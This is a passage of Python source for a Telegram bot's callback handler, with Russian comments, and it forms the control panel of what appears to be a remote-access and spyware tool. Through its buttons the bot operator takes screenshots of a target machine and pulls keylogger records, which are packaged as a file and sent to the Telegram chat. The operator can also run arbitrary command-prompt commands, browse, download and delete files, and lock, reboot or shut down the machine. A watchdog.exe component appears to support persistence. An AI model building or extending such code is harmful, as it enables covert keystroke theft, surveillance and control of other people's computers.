# bot_callbacks.py
"""
Обработчики callback-запросов от inline-кнопок
"""

import time
import os
from telebot import types
from datetime import datetime

# Импорт модулей проекта
from bot_core import (
    get_bot, escape_html, is_admin, get_target_device_hwid,
    get_admin_session, set_admin_session, CURRENT_HWID,
    logger, db
)
from bot_services import (
    take_screenshot, get_process_list, kill_process, lock_computer,
    shutdown_computer, restart_computer, execute_command, get_system_info,
    get_keylog, start_keylogger, stop_keylogger,
    list_files, read_file, delete_file
)

bot = get_bot()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def send_success_message(chat_id, text="успешно ✅"):
    """Отправка сообщения об успехе с автоматическим удалением через 10 секунд"""
    try:
        msg = bot.send_message(chat_id, text)
        # Запланировать удаление через 10 секунд с использованием asyncio
        import asyncio
        async def delete_later():
            await asyncio.sleep(10)
            try:
                bot.delete_message(chat_id, msg.message_id)
            except Exception as e:
                logger.debug(f"Не удалось удалить сообщение: {e}")
        
        # Создаем асинхронную задачу
        import threading
        def run_async():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(delete_later())
            loop.close()
        
        thread = threading.Thread(target=run_async, daemon=True)
        thread.start()
        return msg
    except Exception as e:
        logger.error(f"Ошибка отправки сообщения об успехе: {e}")
        return None

def send_file_manager(chat_id, directory=".", page=0, message_id=None):
    """Отправка интерактивного файлового менеджера"""
    try:
        # Получаем список файлов и директорий
        import glob
        import os
        import sys
        
        # Нормализуем путь
        directory = os.path.normpath(directory)
        if not os.path.exists(directory):
            directory = "."
        
        # Получаем все файлы и директории
        all_items = []
        try:
            # Если директория корневая (.) и мы на Windows, показываем логические диски
            if directory == "." and sys.platform == "win32":
                try:
                    import win32api
                    drives = win32api.GetLogicalDriveStrings()
                    drives = drives.split('\x00')[:-1]  # Разделяем по нулевому символу
                    for drive in drives:
                        if drive:  # C:\ D:\ и т.д.
                            drive_name = drive.rstrip('\\')
                            all_items.append((drive_name, "💿", "drive"))
                except ImportError:
                    # Если win32api не доступен, используем альтернативный метод
                    import string
                    import ctypes
                    drives = []
                    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
                    for letter in string.ascii_uppercase:
                        if bitmask & 1:
                            drives.append(f"{letter}:\\")
                        bitmask >>= 1
                    for drive in drives:
                        drive_name = drive.rstrip('\\')
                        all_items.append((drive_name, "💿", "drive"))
                except Exception as e:
                    logger.debug(f"Не удалось получить список дисков: {e}")
                    # Продолжаем с обычным списком файлов
                    pass
            
            # Если есть элементы (диски), не добавляем обычные файлы и папки
            if not all_items:
                # Директории
                for item in os.listdir(directory):
                    full_path = os.path.join(directory, item)
                    if os.path.isdir(full_path):
                        all_items.append((item, "📁", "dir"))
                # Файлы
                for item in os.listdir(directory):
                    full_path = os.path.join(directory, item)
                    if os.path.isfile(full_path):
                        size = os.path.getsize(full_path)
                        size_str = format_size(size)
                        all_items.append((item, "📄", f"file ({size_str})"))
        except Exception as e:
            logger.error(f"Ошибка чтения директории {directory}: {e}")
            bot.send_message(chat_id, f"❌ Ошибка чтения директории: {e}")
            return
        
        # Пагинация
        items_per_page = 10
        total_pages = (len(all_items) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages - 1))
        
        start_idx = page * items_per_page
        end_idx = min(start_idx + items_per_page, len(all_items))
        page_items = all_items[start_idx:end_idx]
        
        # Создаем клавиатуру
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        
        # Добавляем кнопки для файлов и директорий
        for item_name, icon, item_type in page_items:
            # Для дисков, директорий и файлов разные callback
            if icon == "💿":  # Логический диск
                # Диски уже имеют формат "C:", "D:" и т.д., добавляем обратный слеш для пути
                drive_path = item_name + "\\" if not item_name.endswith("\\") else item_name
                callback_data = f"files_nav_{drive_path}|0"
                button_text = f"{icon} Диск {item_name}"
            elif icon == "📁":  # Директория
                callback_data = f"files_nav_{os.path.join(directory, item_name)}"
                button_text = f"{icon} {item_name}"
            else:  # Файл (📄)
                callback_data = f"files_view_{os.path.join(directory, item_name)}"
                button_text = f"{icon} {item_name}"
                if icon == "📄":
                    button_text += f" ({item_type})"
            
            keyboard.add(types.InlineKeyboardButton(
                text=button_text[:50],  # Ограничиваем длину
                callback_data=callback_data
            ))
        
        # Кнопки навигации
        nav_buttons = []
        if page > 0:
            nav_buttons.append(types.InlineKeyboardButton(
                text="◀️ Назад",
                callback_data=f"files_page_{directory}|{page-1}"
            ))
        
        nav_buttons.append(types.InlineKeyboardButton(
            text=f"📊 Страница {page+1}/{max(1, total_pages)}",
            callback_data="files_info"
        ))
        
        if page < total_pages - 1:
            nav_buttons.append(types.InlineKeyboardButton(
                text="Вперед ▶️",
                callback_data=f"files_page_{directory}|{page+1}"
            ))
        
        if nav_buttons:
            keyboard.row(*nav_buttons)
        
        # Кнопки управления
        control_buttons = []
        
        # Кнопка "На уровень выше"
        parent_dir = os.path.dirname(directory)
        if parent_dir and parent_dir != directory:
            control_buttons.append(types.InlineKeyboardButton(
                text="⬆️ На уровень выше",
                callback_data=f"files_nav_{parent_dir}|0"
            ))
        
        # Кнопка "Текущая директория"
        control_buttons.append(types.InlineKeyboardButton(
            text="📂 Текущая папка",
            callback_data=f"files_nav_{directory}|0"
        ))
        
        if control_buttons:
            keyboard.row(*control_buttons)
        
        # Кнопка "Закрыть"
        keyboard.add(types.InlineKeyboardButton(
            text="❌ Закрыть файловый менеджер",
            callback_data="files_close"
        ))
        
        # Отправляем сообщение
        message_text = f"📁 Файловый менеджер\n📂 Текущая директория: `{directory}`\n📊 Всего элементов: {len(all_items)}"
        
        if message_id:
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=message_text,
                    reply_markup=keyboard,
                    parse_mode='Markdown'
                )
                return
            except Exception as e:
                logger.debug(f"Не удалось редактировать сообщение {message_id}: {e}")
                # Продолжаем отправку нового сообщения
        
        # Отправляем новое сообщение
        bot.send_message(
            chat_id=chat_id,
            text=message_text,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Ошибка отправки файлового менеджера: {e}")
        bot.send_message(chat_id, f"❌ Ошибка файлового менеджера: {e}")

def format_size(size_bytes):
    """Форматирование размера файла в читаемый вид"""
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    elif size_bytes < 1024 * 1024 * 1024:
        return f"{size_bytes / (1024 * 1024):.1f} MB"
    else:
        return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"

def send_file_view(chat_id, filepath):
    """Просмотр файла с опциями"""
    try:
        import os
        
        if not os.path.exists(filepath):
            bot.send_message(chat_id, f"❌ Файл не найден: {filepath}")
            return
        
        filename = os.path.basename(filepath)
        size = os.path.getsize(filepath)
        size_str = format_size(size)
        
        # Создаем клавиатуру с опциями
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        
        # Кнопка "Скачать"
        keyboard.add(types.InlineKeyboardButton(
            text="📥 Скачать файл",
            callback_data=f"files_download_{filepath}"
        ))
        
        # Кнопка "Просмотреть содержимое" (только для текстовых файлов)
        if filename.lower().endswith(('.txt', '.py', '.js', '.html', '.css', '.json', '.xml', '.md', '.log')):
            keyboard.add(types.InlineKeyboardButton(
                text="👁 Просмотреть",
                callback_data=f"files_preview_{filepath}"
            ))
        
        # Кнопка "Удалить" (с подтверждением)
        keyboard.add(types.InlineKeyboardButton(
            text="🗑 Удалить",
            callback_data=f"files_delete_confirm_{filepath}"
        ))
        
        # Кнопка "Назад"
        parent_dir = os.path.dirname(filepath)
        keyboard.add(types.InlineKeyboardButton(
            text="↩️ Назад к списку",
            callback_data=f"files_nav_{parent_dir}|0"
        ))
        
        # Отправляем информацию о файле
        message_text = f"📄 Файл: `{filename}`\n📊 Размер: {size_str}\n📍 Путь: `{filepath}`"
        
        bot.send_message(
            chat_id=chat_id,
            text=message_text,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Ошибка просмотра файла: {e}")
        bot.send_message(chat_id, f"❌ Ошибка просмотра файла: {e}")

# --- ОБРАБОТКА CALLBACK-ЗАПРОСОВ ---

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    """Обработка всех callback-запросов от inline-кнопок"""
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    try:
        # Проверка прав доступа
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ Доступ запрещен.")
            return
        
        data = call.data
        
        # Выбор устройства
        if data.startswith('select_device_'):
            device_hwid = data.replace('select_device_', '')
            device = db.get_device(device_hwid)
            
            if device:
                device_name = device.get('device_name', 'Unknown')
                if set_admin_session(user_id, device_hwid):
                    bot.answer_callback_query(call.id, f"✅ Устройство выбрано: {device_name}")
                    
                    # Создаем панель команд для выбранного устройства (вторая ступень)
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    
                    # Первый ряд: основные команды
                    markup.row(
                        types.InlineKeyboardButton("📸 Скриншот", callback_data="action_screen"),
                        types.InlineKeyboardButton("🖥 Процессы", callback_data="action_procs")
                    )
                    
                    # Второй ряд: дополнительные команды
                    markup.row(
                        types.InlineKeyboardButton("⌨️ Кейлоггер", callback_data="action_keylog"),
                        types.InlineKeyboardButton("ℹ️ Инфо", callback_data="action_info")
                    )
                    
                    # Третий ряд: управление питанием (отдельная категория)
                    markup.row(
                        types.InlineKeyboardButton("⚡ Управление питанием", callback_data="power_management_menu")
                    )
                    
                    # Четвертый ряд: служебные команды
                    markup.row(
                        types.InlineKeyboardButton("💻 CMD", callback_data="action_cmd"),
                        types.InlineKeyboardButton("📁 Файлы", callback_data="action_files")
                    )
                    
                    # Пятый ряд: навигация
                    markup.row(
                        types.InlineKeyboardButton("⬅️ Назад к выбору устройства", callback_data="back_to_device_select"),
                        types.InlineKeyboardButton("🔄 Обновить", callback_data="refresh_panel")
                    )
                    
                    text = f"""
🎛 <b>Панель управления - Команды</b>

📱 <b>Выбранное устройство:</b> {device_name}
🆔 <b>HWID:</b> <code>{device_hwid[:8]}...</code>

Выберите команду для выполнения:
"""
                    
                    bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')
                else:
                    bot.answer_callback_query(call.id, "❌ Ошибка выбора устройства.")
            else:
                bot.answer_callback_query(call.id, "❌ Устройство не найдено.")
        
        # Обновление списка устройств
        elif data == 'refresh_devices':
            bot.answer_callback_query(call.id, "🔄 Обновляю список устройств...")
            time.sleep(1)
            bot.answer_callback_query(call.id, "✅ Список обновлен.")
        
        # Добавление устройства
        elif data == 'add_device':
            bot.answer_callback_query(call.id, "➕ Добавление устройства...")
            # Здесь можно добавить логику добавления нового устройства
            time.sleep(1)
            bot.answer_callback_query(call.id, "✅ Устройство будет автоматически зарегистрировано при запуске бота.")
        
        # Назад к выбору устройства
        elif data == 'back_to_device_select':
            bot.answer_callback_query(call.id, "⬅️ Возвращаюсь к выбору устройства...")
            
            # Получаем список устройств
            devices = db.get_all_devices()
            
            if not devices:
                bot.edit_message_text("📭 Нет доступных устройств. Используйте команду /start на целевом устройстве для регистрации.", chat_id, message_id, parse_mode='HTML')
                return
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            
            # Кнопки выбора устройств
            device_buttons = []
            for device in devices:
                device_name = escape_html(device.get('device_name', 'Unknown'))
                device_hwid = device.get('hwid')
                last_online = device.get('last_online', 'Never')
                
                # Форматируем время последней активности
                if last_online:
                    try:
                        last_dt = datetime.fromisoformat(last_online.replace('Z', '+00:00'))
                        time_ago = datetime.now() - last_dt
                        if time_ago.total_seconds() < 60:
                            last_str = "только что"
                        elif time_ago.total_seconds() < 3600:
                            last_str = f"{int(time_ago.total_seconds() / 60)} мин назад"
                        else:
                            last_str = f"{int(time_ago.total_seconds() / 3600)} ч назад"
                    except:
                        last_str = "давно"
                else:
                    last_str = "никогда"
                
                button_text = f"{device_name} ({last_str})"
                callback_data = f"select_device_{device_hwid}"
                device_buttons.append(types.InlineKeyboardButton(button_text, callback_data=callback_data))
            
            # Добавляем кнопки устройствами (по 2 в ряд)
            for i in range(0, len(device_buttons), 2):
                if i + 1 < len(device_buttons):
                    markup.row(device_buttons[i], device_buttons[i + 1])
                else:
                    markup.row(device_buttons[i])
            
            # Кнопка обновления списка
            markup.row(types.InlineKeyboardButton("🔄 Обновить список", callback_data="refresh_devices"))
            
            # Текущее выбранное устройство
            session = get_admin_session(user_id)
            current_device_name = "Не выбрано"
            if session and session.get('device_hwid'):
                current_device = db.get_device(session.get('device_hwid'))
                if current_device:
                    current_device_name = current_device.get('device_name', 'Неизвестно')
            
            text = f"""
🎛 <b>Панель управления - Выбор устройства</b>

📱 <b>Доступные устройства:</b> {len(devices)}
🎯 <b>Текущее выбранное устройство:</b> {current_device_name}

Выберите устройство для управления:
"""
            
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')
        
        # Обновление панели команд
        elif data == 'refresh_panel':
            bot.answer_callback_query(call.id, "🔄 Обновляю панель...")
            
            # Получаем текущее выбранное устройство
            session = get_admin_session(user_id)
            if not session or not session.get('device_hwid'):
                bot.answer_callback_query(call.id, "❌ Сначала выберите устройство.")
                return
            
            device_hwid = session.get('device_hwid')
            device = db.get_device(device_hwid)
            
            if not device:
                bot.answer_callback_query(call.id, "❌ Устройство не найдено.")
                return
            
            device_name = device.get('device_name', 'Unknown')
            
            # Создаем панель команд для выбранного устройства (вторая ступень)
            markup = types.InlineKeyboardMarkup(row_width=2)
            
            # Первый ряд: основные команды
            markup.row(
                types.InlineKeyboardButton("📸 Скриншот", callback_data="action_screen"),
                types.InlineKeyboardButton("🖥 Процессы", callback_data="action_procs")
            )
            
            # Второй ряд: дополнительные команды
            markup.row(
                types.InlineKeyboardButton("⌨️ Кейлоггер", callback_data="action_keylog"),
                types.InlineKeyboardButton("ℹ️ Инфо", callback_data="action_info")
            )
            
            # Третий ряд: управление питанием (отдельная категория)
            markup.row(
                types.InlineKeyboardButton("⚡ Управление питанием", callback_data="power_management_menu")
            )
            
            # Четвертый ряд: служебные команды
            markup.row(
                types.InlineKeyboardButton("💻 CMD", callback_data="action_cmd"),
                types.InlineKeyboardButton("📁 Файлы", callback_data="action_files")
            )
            
            # Пятый ряд: навигация
            markup.row(
                types.InlineKeyboardButton("⬅️ Назад к выбору устройства", callback_data="back_to_device_select"),
                types.InlineKeyboardButton("🔄 Обновить", callback_data="refresh_panel")
            )
            
            text = f"""
🎛 <b>Панель управления - Команды</b>

📱 <b>Выбранное устройство:</b> {device_name}
🆔 <b>HWID:</b> <code>{device_hwid[:8]}...</code>

Выберите команду для выполнения:
"""
            
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')
        
        # Меню управления питанием (третья ступень)
        elif data == 'power_management_menu':
            bot.answer_callback_query(call.id, "⚡ Открываю меню управления питанием...")
            
            # Получаем текущее выбранное устройство
            session = get_admin_session(user_id)
            if not session or not session.get('device_hwid'):
                bot.answer_callback_query(call.id, "❌ Сначала выберите устройство.")
                return
            
            device_hwid = session.get('device_hwid')
            device = db.get_device(device_hwid)
            
            if not device:
                bot.answer_callback_query(call.id, "❌ Устройство не найдено.")
                return
            
            device_name = device.get('device_name', 'Unknown')
            
            # Создаем меню управления питанием (третья ступень)
            markup = types.InlineKeyboardMarkup(row_width=1)
            
            # Кнопки управления питанием
            markup.row(
                types.InlineKeyboardButton("🔒 Блокировка компьютера", callback_data="panel_lock")
            )
            markup.row(
                types.InlineKeyboardButton("🔄 Перезагрузка компьютера", callback_data="panel_reboot")
            )
            markup.row(
                types.InlineKeyboardButton("⏻ Выключение компьютера", callback_data="panel_poweroff")
            )
            
            # Кнопка возврата
            markup.row(
                types.InlineKeyboardButton("⬅️ Назад к панели команд", callback_data="back_to_command_panel")
            )
            
            text = f"""
⚡ <b>Управление питанием</b>

📱 <b>Выбранное устройство:</b> {device_name}
🆔 <b>HWID:</b> <code>{device_hwid[:8]}...</code>

Выберите действие:
• <b>Блокировка</b> - заблокировать компьютер
• <b>Перезагрузка</b> - перезагрузить компьютер
• <b>Выключение</b> - выключить компьютер

⚠️ Все действия требуют подтверждения.
"""
            
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')
        
        # Возврат к панели команд
        elif data == 'back_to_command_panel':
            bot.answer_callback_query(call.id, "⬅️ Возвращаюсь к панели команд...")
            
            # Получаем текущее выбранное устройство
            session = get_admin_session(user_id)
            if not session or not session.get('device_hwid'):
                bot.answer_callback_query(call.id, "❌ Сначала выберите устройство.")
                return
            
            device_hwid = session.get('device_hwid')
            device = db.get_device(device_hwid)
            
            if not device:
                bot.answer_callback_query(call.id, "❌ Устройство не найдено.")
                return
            
            device_name = device.get('device_name', 'Unknown')
            
            # Создаем панель команд для выбранного устройства (вторая ступень)
            markup = types.InlineKeyboardMarkup(row_width=2)
            
            # Первый ряд: основные команды
            markup.row(
                types.InlineKeyboardButton("📸 Скриншот", callback_data="action_screen"),
                types.InlineKeyboardButton("🖥 Процессы", callback_data="action_procs")
            )
            
            # Второй ряд: дополнительные команды
            markup.row(
                types.InlineKeyboardButton("⌨️ Кейлоггер", callback_data="action_keylog"),
                types.InlineKeyboardButton("ℹ️ Инфо", callback_data="action_info")
            )
            
            # Третий ряд: управление питанием (отдельная категория)
            markup.row(
                types.InlineKeyboardButton("⚡ Управление питанием", callback_data="power_management_menu")
            )
            
            # Четвертый ряд: служебные команды
            markup.row(
                types.InlineKeyboardButton("💻 CMD", callback_data="action_cmd"),
                types.InlineKeyboardButton("📁 Файловый менеджер", callback_data="action_files")
            )
            
            # Пятый ряд: навигация
            markup.row(
                types.InlineKeyboardButton("⬅️ Назад к выбору устройства", callback_data="back_to_device_select"),
                types.InlineKeyboardButton("🔄 Обновить", callback_data="refresh_panel")
            )
            
            text = f"""
🎛 <b>Панель управления - Команды</b>

📱 <b>Выбранное устройство:</b> {device_name}
🆔 <b>HWID:</b> <code>{device_hwid[:8]}...</code>

Выберите команду для выполнения:
"""
            
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode='HTML')
        
        # Управление питанием из панели (третья ступень)
        elif data == 'panel_lock':
            bot.answer_callback_query(call.id, "🔒 Запускаю процедуру блокировки...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                # Запускаем поток подтверждения
                start_confirmation_flow(user_id, "lock")
                
                # Отправляем сообщение с подтверждением
                confirmation_msg = get_confirmation_full_message("lock")
                bot.send_message(chat_id, confirmation_msg, parse_mode='HTML')
                
                # Удаляем сообщение панели
                try:
                    bot.delete_message(chat_id, message_id)
                except:
                    pass
                    
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
        
        elif data == 'panel_reboot':
            bot.answer_callback_query(call.id, "🔄 Запускаю процедуру перезагрузки...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                # Запускаем поток подтверждения
                start_confirmation_flow(user_id, "reboot")
                
                # Отправляем сообщение с подтверждением
                confirmation_msg = get_confirmation_full_message("reboot")
                bot.send_message(chat_id, confirmation_msg, parse_mode='HTML')
                
                # Удаляем сообщение панели
                try:
                    bot.delete_message(chat_id, message_id)
                except:
                    pass
                    
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
        
        elif data == 'panel_poweroff':
            bot.answer_callback_query(call.id, "⏻ Запускаю процедуру выключения...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                # Запускаем поток подтверждения
                start_confirmation_flow(user_id, "poweroff")
                
                # Отправляем сообщение с подтверждением
                confirmation_msg = get_confirmation_full_message("poweroff")
                bot.send_message(chat_id, confirmation_msg, parse_mode='HTML')
                
                # Удаляем сообщение панели
                try:
                    bot.delete_message(chat_id, message_id)
                except:
                    pass
                    
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
        
        # Интерактивный режим CMD
        elif data == 'action_cmd':
            bot.answer_callback_query(call.id, "💻 Перехожу в режим терминала...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                # Устанавливаем состояние ожидания ввода команды
                from bot_core import set_user_state
                set_user_state(user_id, 'waiting_cmd_input', 'cmd', {'target_hwid': target_hwid})
                
                # Отправляем сообщение с инструкцией
                bot.send_message(chat_id, "💻 Вы перешли в режим терминала. Введите системную команду для выполнения в CMD:\n\nДля отмены введите /cancel")
                
                # Удаляем сообщение панели (опционально)
                try:
                    bot.delete_message(chat_id, message_id)
                except:
                    pass
                    
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
        
        # Файлы (интерактивный файловый менеджер)
        elif data == 'action_files':
            bot.answer_callback_query(call.id, "📁 Открываю файловый менеджер...")
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                # Запускаем файловый менеджер с текущей директорией
                send_file_manager(chat_id, ".", 0, message_id)
                db.log_action(user_id, "file_manager_open")
                
            except Exception as e:
                logger.error(f"Ошибка открытия файлового менеджера: {e}")
                bot.send_message(chat_id, f"❌ Ошибка открытия файлового менеджера: {e}")
        
        # Скриншот
        elif data == 'action_screen':
            bot.answer_callback_query(call.id, "📸 Делаю скриншот...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                screenshot_path = take_screenshot()
                
                # Получаем информацию об устройстве для подписи
                device = db.get_device(target_hwid)
                device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
                
                # Создаем подпись с именем устройства
                caption = f"📸 Скриншот экрана\n📱 Устройство: {device_name}\n🆔 HWID: {target_hwid[:8]}..."
                
                with open(screenshot_path, 'rb') as photo:
                    bot.send_photo(chat_id, photo, caption=caption)
                
                os.remove(screenshot_path)
                db.log_action(user_id, "screen_from_panel")
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
        
        # Список процессов
        elif data == 'action_procs':
            bot.answer_callback_query(call.id, "🖥 Получаю список процессов...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                processes = get_process_list(limit=10)
                
                # Форматирование в моно-формате для легкого копирования
                header = "🖥 Топ-10 процессов по использованию CPU:\n\n"
                monospace_text = header
                
                for i, proc in enumerate(processes, 1):
                    name = proc.get('name', 'Unknown')
                    pid = proc.get('pid', 'N/A')
                    cpu = proc.get('cpu_percent', 0)
                    memory = proc.get('memory_percent', 0)
                    
                    # Форматируем в виде таблицы для удобного копирования
                    monospace_text += f"{i:2d}. {name[:30]:30} PID: {pid:6} CPU: {cpu:5.1f}% RAM: {memory:5.1f}%\n"
                
                # Отправляем в моноширинном формате
                bot.send_message(chat_id, f"<pre>{escape_html(monospace_text)}</pre>", parse_mode='HTML')
                db.log_action(user_id, "procs_from_panel")
            except Exception as e:
                logger.error(f"Ошибка отправки кейлога: {e}", exc_info=True)
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
                bot.send_message(chat_id, f"❌ Ошибка отправки кейлога: {str(e)[:200]}")
        
        # Подтверждение блокировки
        elif data == 'lock_confirm':
            bot.answer_callback_query(call.id, "🔒 Блокирую компьютер...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                if lock_computer():
                    send_success_message(chat_id, "успешно ✅")
                    db.log_action(user_id, "lock_computer")
                else:
                    bot.send_message(chat_id, "❌ Ошибка блокировки компьютера.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка: {e}")
        
        # Отмена блокировки
        elif data == 'lock_cancel':
            bot.answer_callback_query(call.id, "❌ Блокировка отменена.")
            bot.send_message(chat_id, "❌ Блокировка компьютера отменена.")
        
        # Подтверждение выключения
        elif data == 'poweroff_confirm':
            bot.answer_callback_query(call.id, "⏻ Выключаю компьютер...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                if shutdown_computer(delay=10):
                    send_success_message(chat_id, "успешно ✅")
                    db.log_action(user_id, "shutdown_computer")
                else:
                    bot.send_message(chat_id, "❌ Ошибка выключения компьютера.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка: {e}")
        
        # Отмена выключения
        elif data == 'poweroff_cancel':
            bot.answer_callback_query(call.id, "❌ Выключение отменено.")
            bot.send_message(chat_id, "❌ Выключение компьютера отменено.")
        
        # Подтверждение перезагрузки
        elif data == 'reboot_confirm':
            bot.answer_callback_query(call.id, "🔄 Перезагружаю компьютер...")
            
            try:
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                if restart_computer(delay=10):
                    send_success_message(chat_id, "успешно ✅")
                    db.log_action(user_id, "reboot_computer")
                else:
                    bot.send_message(chat_id, "❌ Ошибка перезагрузки компьютера.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Ошибка: {e}")
        
        # Отмена перезагрузки
        elif data == 'reboot_cancel':
            bot.answer_callback_query(call.id, "❌ Перезагрузка отменена.")
            bot.send_message(chat_id, "❌ Перезагрузка компьютера отменена.")
        
        # Кейлоггер
        elif data == 'action_keylog':
            bot.answer_callback_query(call.id, "⌨️ Получаю лог клавиатуры...")
            
            try:
                import io
                target_hwid = get_target_device_hwid(user_id)
                
                if target_hwid != CURRENT_HWID:
                    bot.answer_callback_query(call.id, "⚠️ Доступно только для текущего устройства.")
                    return
                
                keylog = get_keylog()
                logger.info(f"Получено записей кейлога: {len(keylog)}")
                
                if not keylog:
                    bot.send_message(chat_id, "📭 Лог клавиатуры пуст.")
                    logger.warning("Кейлог пуст, возможно кейлоггер не запущен")
                    return
                
                # Формируем текст лога в переменную (string)
                log_text = f"Лог нажатий клавиш (всего {len(keylog)} записей)\n"
                log_text += f"Устройство: {target_hwid}\n"
                log_text += f"Время создания: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                log_text += "=" * 50 + "\n\n"
                
                for i, entry in enumerate(keylog, 1):
                    time_str = entry.get('time', 'N/A')
                    key = entry.get('key', 'N/A')
                    event_type = entry.get('event_type', 'down')
                    
                    event_text = "НАЖАТИЕ" if event_type == 'down' else "ОТПУСКАНИЕ"
                    log_text += f"{i:4d}. {time_str} [{event_text}] {key}\n"
                
                # ЖЕЛЕЗОБЕТОННЫЙ ФИКС: используем io.BytesIO вместо записи на диск
                # Преобразуем строку в байты
                file_data = io.BytesIO(log_text.encode('utf-8'))
                
                # КРИТИЧЕСКИ ВАЖНО: Telegram API требует наличия имени файла
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"keylog_{timestamp}.txt"
                file_data.name = filename
                
                # Отправляем файл через send_document
                bot.send_document(
                    chat_id,
                    file_data,
                    caption=f"⌨️ Лог клавиатуры ({len(keylog)} записей)",
                    visible_file_name=filename
                )
                
                db.log_action(user_id, "keylog_view")
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)[:50]}")
        
        # Информация об устройстве
        elif data == 'action_info':
            bot.answer_callback_query(call.id, "ℹ️ Получаю информацию...")
            
            target_hwid = get_target_device_hwid(user_id)
            device = db.get_device(target_hwid)
            
            if device:
                device_name = device.get('device_name', 'Unknown')
                last_online = device.get('last_online', 'Never')
                watchdog_status = device.get('watchdog_status', 'unknown')
                
                # Проверяем реальное наличие watchdog.exe для текущего устройства
                import os
                import sys
                
                def check_watchdog_file_exists():
                    """Проверка наличия файла watchdog.exe"""
                    if getattr(sys, 'frozen', False):
                        base_dir = os.path.dirname(sys.executable)
                    else:
                        base_dir = os.path.dirname(os.path.abspath(__file__))
                    
                    watchdog_exe_path = os.path.join(base_dir, 'watchdog.exe')
                    return os.path.exists(watchdog_exe_path)
                
                # Определяем реальный статус
                if target_hwid == CURRENT_HWID:
                    watchdog_file_exists = check_watchdog_file_exists()
                    if not watchdog_file_exists:
                        real_status = "not installed"
                    else:
                        real_status = watchdog_status
                else:
                    # Для удаленных устройств доверяем базе данных
                    real_status = watchdog_status
                
                # Получаем системную информацию для текущего устройства
                system_info_text = ""
                if target_hwid == CURRENT_HWID:
                    system_info = get_system_info()
                    if system_info:
                        system_info_text = f"""
    💻 <b>Системная информация:</b>
    🖥 CPU: {system_info.get('cpu_percent', 'N/A')}% ({system_info.get('cpu_count', 'N/A')} ядер)
    🧠 ОЗУ: {system_info.get('memory_percent', 'N/A')}% ({system_info.get('memory_used_gb', 0):.1f}/{system_info.get('memory_total_gb', 0):.1f} GB)
    💾 Диск: {system_info.get('disk_percent', 'N/A')}% ({system_info.get('disk_used_gb', 0):.1f}/{system_info.get('disk_total_gb', 0):.1f} GB)
